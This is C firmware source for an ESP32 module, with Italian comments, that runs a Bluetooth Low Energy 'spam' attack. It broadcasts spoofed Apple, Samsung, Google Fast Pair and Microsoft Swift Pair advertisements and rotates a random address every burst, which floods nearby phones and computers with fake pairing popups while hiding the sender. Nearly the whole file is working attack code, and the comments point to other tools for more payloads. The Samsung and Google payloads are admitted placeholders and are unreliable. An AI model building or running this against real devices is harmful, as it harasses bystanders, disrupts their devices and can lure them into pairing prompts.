#include <string.h>
#include "esp_log.h"
#include "esp_err.h"
#include "TaskManager.h"
#include "ble_spam.h"
#include "bleMng.h"

static const char *TAG = "BLE_SPAM";

#if CONFIG_BT_ENABLED

#include "esp_random.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/event_groups.h"
#include "host/ble_hs.h"

#define BLE_SPAM_TASK_PRIO        5
#define BLE_SPAM_TASK_STACK       4096
#define BLE_SPAM_EVT_TASK_EXITED  BIT0

/* Budget legacy adv (31 byte totali): flags AD (3) + header AD del
 * payload vendor (len+type, 2) = 5 byte fissi, restano 26 per il
 * payload vero e proprio. Ogni builder sotto sta ben dentro il limite. */
#define BLE_SPAM_MAX_PAYLOAD      26

#define BLE_SPAM_ADV_ITVL         0x00A0   /* 100ms, minimo comune anche per adv non connettibile */
#define BLE_SPAM_BURST_MS         150      /* quanto resta up ogni identita' random prima di ruotare */

static TaskHandle_t       s_task_handle = NULL;
static EventGroupHandle_t s_evt = NULL;
static volatile bool      s_running = false;
static ble_spam_type_t    s_spam_type = BLE_SPAM_APPLE;

typedef enum {
    BLE_SPAM_VENDOR_APPLE = 0,
    BLE_SPAM_VENDOR_SAMSUNG,
    BLE_SPAM_VENDOR_GOOGLE,
    BLE_SPAM_VENDOR_MICROSOFT,
    BLE_SPAM_VENDOR_COUNT,
} ble_spam_vendor_t;

/* --- payload builders ---
 * Ognuno ritorna la lunghezza scritta in buf (mai oltre BLE_SPAM_MAX_PAYLOAD).
 * I byte non "strutturali" (status/batteria/riempimento) sono casuali:
 * ai fini del popup contano il company ID e il byte di sub-type, il resto
 * su iOS/Android non viene validato finche' non parte un pairing vero. */

/* Apple Continuity, company ID 0x004C. Modelli Proximity Pairing (0x07)
 * verificati da apple_ble_spam_ofw (Flipper Zero) -- vedi ble_spam.h. */
static const struct { uint16_t model; const char *name; } s_apple_airpods_models[] = {
    { 0x0220, "AirPods" },
    { 0x0F20, "AirPods 2" },
    { 0x1320, "AirPods 3" },
    { 0x0E20, "AirPods Pro" },
    { 0x1420, "AirPods Pro 2" },
    { 0x0620, "Beats Solo3" },
};

/* Nearby Action (0x0F): flag 0xC0 + un "action type" che decide il popup
 * mostrato. Questi due valori sono gli unici che ho potuto verificare con
 * ragionevole confidenza; la lista completa dei codici (setup AirTag,
 * HomePod, Apple Pencil, ecc.) va presa da apple_ble_spam_ofw/apple_ble_spam.c
 * o dal codice di ESP32Marauder -- aggiungili qui allo stesso modo in cui
 * abbiamo esteso le tabelle di ble_identify.c. */
static const uint8_t s_apple_nearby_actions[] = {
    0x13,   /* osservato come "AppleTV AutoFill" */
    0x20,   /* osservato come "Join This AppleTV" */
};

static size_t build_apple_payload(uint8_t *buf, size_t max_len)
{
    /* Alterna Proximity Pairing (popup stile AirPods) e Nearby Action
     * (popup stile "Setup New Device"), come fanno "Sour Apple"/"Apple Juice". */
    bool proximity_pairing = (esp_random() & 1) != 0;

    buf[0] = 0x4C;   /* Apple, Inc. */
    buf[1] = 0x00;

    if (proximity_pairing) {
        int idx = esp_random() % (sizeof(s_apple_airpods_models) / sizeof(s_apple_airpods_models[0]));
        uint16_t model = s_apple_airpods_models[idx].model;

        buf[2] = 0x07;   /* Proximity Pairing */
        buf[3] = 18;     /* lunghezza del body che segue */
        buf[4] = 0x01;   /* prefix osservato per i modelli audio (AirTag usa 0x05, non gestito qui) */
        buf[5] = (uint8_t)(model & 0xFF);        /* ordine little-endian: verifica se il popup
                                                    * mostra il device sbagliato, prova a invertire */
        buf[6] = (uint8_t)((model >> 8) & 0xFF);
        for (int i = 7; i < 4 + 18; i++) {
            buf[i] = (uint8_t)esp_random();   /* status/batteria/lid/colore/riempimento: non validati */
        }
        return 4 + 18;
    }

    int idx = esp_random() % (sizeof(s_apple_nearby_actions) / sizeof(s_apple_nearby_actions[0]));

    buf[2] = 0x0F;   /* Nearby Action */
    buf[3] = 0x04;   /* flags + action + 2 byte random */
    buf[4] = 0xC0;
    buf[5] = s_apple_nearby_actions[idx];
    buf[6] = (uint8_t)esp_random();
    buf[7] = (uint8_t)esp_random();
    return 8;
}

/* Samsung, company ID 0x0075. Struttura MOLTO meno verificata delle altre:
 * qui c'e' solo uno scheletro plausibile (sub-type + "device type" che
 * ruota) per non lasciare il vendor vuoto. Se vuoi che triggeri
 * affidabilmente i popup Galaxy Buds/Watch, prendi i byte esatti dalla
 * wiki di ESP32Marauder ("Samsung BLE Spam") e sostituiscili qui. */
static size_t build_samsung_payload(uint8_t *buf, size_t max_len)
{
    static const uint8_t device_types[] = { 0x03, 0x02 };   /* placeholder: buds-like / watch-like */
    int idx = esp_random() % (sizeof(device_types) / sizeof(device_types[0]));

    buf[0] = 0x75;
    buf[1] = 0x00;
    buf[2] = 0x01;               /* action/show byte, best-effort */
    buf[3] = device_types[idx];
    buf[4] = (uint8_t)esp_random();
    buf[5] = (uint8_t)esp_random();
    return 6;
}

/* Microsoft Swift Pair, company ID 0x0006. Struttura da
 * learn.microsoft.com (Beacon ID 0x03, byte RSSI riservato fisso 0x80) --
 * stessa che usa ble_identify.c per il rilevamento, qui alta confidenza. */
static size_t build_microsoft_payload(uint8_t *buf, size_t max_len)
{
    static const char *names[] = { "Surface Pen", "Xbox Controller", "PIXART Mouse" };
    int idx = esp_random() % (sizeof(names) / sizeof(names[0]));
    size_t name_len = strlen(names[idx]);
    if (name_len > max_len - 5) {
        name_len = max_len - 5;
    }

    buf[0] = 0x06;   /* Microsoft */
    buf[1] = 0x00;
    buf[2] = 0x03;   /* Beacon ID: Swift Pair */
    buf[3] = 0x00;   /* Sub scenario: normal pairing */
    buf[4] = 0x80;   /* Reserved RSSI byte, fisso per spec */
    memcpy(&buf[5], names[idx], name_len);
    return 5 + name_len;
}

/* Google Fast Pair: non e' manufacturer data ma Service Data sull'UUID
 * 0xFE2C (AD type 0x16). Un Model ID non registrato su Google mostra
 * comunque il prompt Fast Pair generico ("dispositivo Bluetooth"), solo
 * senza nome/immagine dedicati -- per la scheda "ricca" serve un Model ID
 * pubblico vero, prendilo da un vero device o dalla documentazione Fast Pair. */
static size_t build_google_svc_data(uint8_t *buf, size_t max_len)
{
    buf[0] = 0x2C;   /* UUID 0xFE2C, little-endian */
    buf[1] = 0xFE;
    buf[2] = (uint8_t)esp_random();   /* Model ID, 3 byte -- placeholder non registrato */
    buf[3] = (uint8_t)esp_random();
    buf[4] = (uint8_t)esp_random();
    return 5;
}

static ble_spam_vendor_t pick_vendor(void)
{
    switch (s_spam_type) {
        case BLE_SPAM_APPLE:     return BLE_SPAM_VENDOR_APPLE;
        case BLE_SPAM_SAMSUNG:   return BLE_SPAM_VENDOR_SAMSUNG;
        case BLE_SPAM_GOOGLE:    return BLE_SPAM_VENDOR_GOOGLE;
        case BLE_SPAM_MICROSOFT: return BLE_SPAM_VENDOR_MICROSOFT;
        case BLE_SPAM_ALL:
        default:
            return (ble_spam_vendor_t)(esp_random() % BLE_SPAM_VENDOR_COUNT);
    }
}

static void send_one_burst(void)
{
    uint8_t payload[BLE_SPAM_MAX_PAYLOAD];
    struct ble_hs_adv_fields fields;
    memset(&fields, 0, sizeof(fields));
    fields.flags = BLE_HS_ADV_F_DISC_GEN | BLE_HS_ADV_F_BREDR_UNSUP;

    size_t len = 0;
    switch (pick_vendor()) {
        case BLE_SPAM_VENDOR_APPLE:
            len = build_apple_payload(payload, sizeof(payload));
            fields.mfg_data = payload;
            fields.mfg_data_len = len;
            break;
        case BLE_SPAM_VENDOR_SAMSUNG:
            len = build_samsung_payload(payload, sizeof(payload));
            fields.mfg_data = payload;
            fields.mfg_data_len = len;
            break;
        case BLE_SPAM_VENDOR_MICROSOFT:
            len = build_microsoft_payload(payload, sizeof(payload));
            fields.mfg_data = payload;
            fields.mfg_data_len = len;
            break;
        case BLE_SPAM_VENDOR_GOOGLE:
            len = build_google_svc_data(payload, sizeof(payload));
            fields.svc_data_uuid16 = payload;
            fields.svc_data_uuid16_len = len;
            break;
        default:
            return;
    }

    /* Nuovo indirizzo non-resolvable private ad ogni burst: agli occhi
     * dei dispositivi vicini sembra un device sempre diverso, non lo
     * stesso che spamma ripetutamente. */
    ble_addr_t addr;
    if (ble_hs_id_gen_rnd(1, &addr) != 0) {
        return;
    }
    if (ble_hs_id_set_rnd(addr.val) != 0) {
        return;
    }

    if (ble_gap_adv_set_fields(&fields) != 0) {
        return;
    }

    struct ble_gap_adv_params adv_params = {
        .conn_mode = BLE_GAP_CONN_MODE_NON,
        .disc_mode = BLE_GAP_DISC_MODE_GEN,
        .itvl_min = BLE_SPAM_ADV_ITVL,
        .itvl_max = BLE_SPAM_ADV_ITVL,
    };

    /* duration_ms fa fermare l'adv da solo -- il task sotto dorme circa
     * lo stesso tempo e poi passa alla prossima identita'/payload. */
    ble_gap_adv_start(BLE_OWN_ADDR_RANDOM, NULL, BLE_SPAM_BURST_MS, &adv_params, NULL, NULL);
}

static void ble_spam_task(void *param)
{
    if (s_evt) {
        xEventGroupClearBits(s_evt, BLE_SPAM_EVT_TASK_EXITED);
    }

    while (s_running) {
        send_one_burst();
        vTaskDelay(pdMS_TO_TICKS(BLE_SPAM_BURST_MS + 20));
    }

    ble_gap_adv_stop();   /* nel caso ci fosse ancora un burst in volo */

    if (s_evt) {
        xEventGroupSetBits(s_evt, BLE_SPAM_EVT_TASK_EXITED);
    }
    task_manager_unregister_current_task();
    vTaskDelete(NULL);
}

esp_err_t ble_spam_start(ble_spam_type_t type)
{
    if (!ble_is_ready()) {
        ESP_LOGW(TAG, "BLE not ready: call ble_init() and wait sync before calling ble_spam_start()");
        return ESP_ERR_INVALID_STATE;
    }
    if (s_running) {
        return ESP_OK;
    }
    if (s_evt == NULL) {
        s_evt = xEventGroupCreate();
        if (s_evt == NULL) {
            return ESP_ERR_NO_MEM;
        }
    }

    s_spam_type = type;
    s_running = true;

    esp_err_t err = task_manager_create_task(ble_spam_task, "ble_spam_task",
                                              BLE_SPAM_TASK_STACK, NULL,
                                              BLE_SPAM_TASK_PRIO, &s_task_handle);
    if (err != ESP_OK) {
        s_running = false;
        ESP_LOGE(TAG, "failed to create ble_spam_task: (%d) %s", err, esp_err_to_name(err));
        return err;
    }

    ESP_LOGI(TAG, "BLE spam started (type=%d)", (int)type);
    return ESP_OK;
}

esp_err_t ble_spam_stop(void)
{
    if (!s_running) {
        return ESP_OK;
    }
    s_running = false;

    EventBits_t bits = xEventGroupWaitBits(
        s_evt,
        BLE_SPAM_EVT_TASK_EXITED,
        pdTRUE, pdFALSE,
        pdMS_TO_TICKS(2000)
    );

    s_task_handle = NULL;

    if ((bits & BLE_SPAM_EVT_TASK_EXITED) == 0) {
        ESP_LOGW(TAG, "ble_spam_task non ha confermato l'uscita entro il timeout");
        return ESP_ERR_TIMEOUT;
    }
    return ESP_OK;
}

bool ble_spam_is_running(void)
{
    return s_running;
}

#else /* !CONFIG_BT_ENABLED */

esp_err_t ble_spam_start(ble_spam_type_t type)
{
    (void)type;
    ESP_LOGW(TAG, "BLE disabilitato in questa build (CONFIG_BT_ENABLED non impostato)");
    return ESP_ERR_NOT_SUPPORTED;
}

esp_err_t ble_spam_stop(void)
{
    return ESP_OK;
}

bool ble_spam_is_running(void)
{
    return false;
}

#endif /* CONFIG_BT_ENABLED */
